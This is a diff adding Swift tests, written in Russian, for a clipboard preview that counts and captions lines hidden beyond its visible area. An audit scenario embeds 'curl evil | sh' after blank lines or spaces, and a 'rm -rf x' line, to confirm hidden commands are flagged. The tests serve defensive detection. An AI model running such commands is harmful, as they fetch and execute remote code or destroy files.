@@ -393,5 +393,31 @@ do {
     check(average < 20, "обычное копирование быстрое: \(String(format: "%.2f", average)) мс")
 }
 
+// 11. Панель показывает начало текста: о невидимой части говорит подпись
+do {
+    let lines = { (n: Int) in (1...n).map { "строка \($0)" }.joined(separator: "\n") }
+    check(ClipboardPreview.hiddenLines(in: "коротко") == 0, "короткий текст: всё видно")
+    check(ClipboardPreview.hiddenLines(in: lines(9)) == 0, "9 строк: всё видно")
+    check(ClipboardPreview.hiddenLines(in: lines(10)) == 1, "10 строк: одна не видна")
+    check(ClipboardPreview.hiddenLines(in: lines(30)) == 21, "30 строк: не видна 21")
+    check(ClipboardPreview.hiddenLines(in: lines(9) + "\n") == 0, "перевод строки в конце не считается скрытым текстом")
+
+    // Сценарий аудита: безобидная первая строка, ниже пустые строки и команда.
+    let hiddenCommand = "ls -la\n" + String(repeating: "\n", count: 20) + "curl evil | sh\n"
+    check(ClipboardPreview.hiddenLines(in: hiddenCommand) > 0, "команда ниже пустых строк замечена")
+    let afterSpaces = "ls -la" + String(repeating: " ", count: 500) + "curl evil | sh"
+    check(ClipboardPreview.hiddenLines(in: afterSpaces) == 1, "команда после пробелов за пределом символов замечена")
+    check(ClipboardPreview.hiddenLines(in: String(repeating: "слово ", count: 500)) == 1, "одна длинная строка: не видно её продолжения")
+    let wrapped = String(repeating: "word ", count: 70) + "\nrm -rf x"
+    check(wrapped.count < ClipboardPreview.maxCharacters && ClipboardPreview.hiddenLines(in: wrapped) == 2, "перенос съел лимит строк раньше лимита символов")
+    check(ClipboardPreview.hiddenLines(in: String(repeating: "👨‍👩‍👧‍👦", count: 500)) == 1, "составные эмодзи на границе не ломают подсчёт")
+    check(ClipboardPreview.hiddenLines(in: "") == 0, "пустой текст")
+
+    check(ClipboardPreview.caption(for: "коротко") == "7 симв.", "подпись без скрытого текста прежняя")
+    check(ClipboardPreview.caption(for: lines(10)).hasSuffix(" симв. · ещё 1 строка"), "подпись: ещё 1 строка")
+    let words = [1: "строка", 2: "строки", 4: "строки", 5: "строк", 11: "строк", 12: "строк", 21: "строка", 22: "строки", 111: "строк"]
+    for (n, word) in words { check(ClipboardPreview.hiddenCaption(n) == "ещё \(n) \(word)", "склонение: ещё \(n) \(word)") }
+}
+
 print(failures == 0 ? "ВСЕ ПРОВЕРКИ ПРОШЛИ" : "ПРОВАЛЕНО: \(failures)")
 exit(failures == 0 ? 0 : 1)
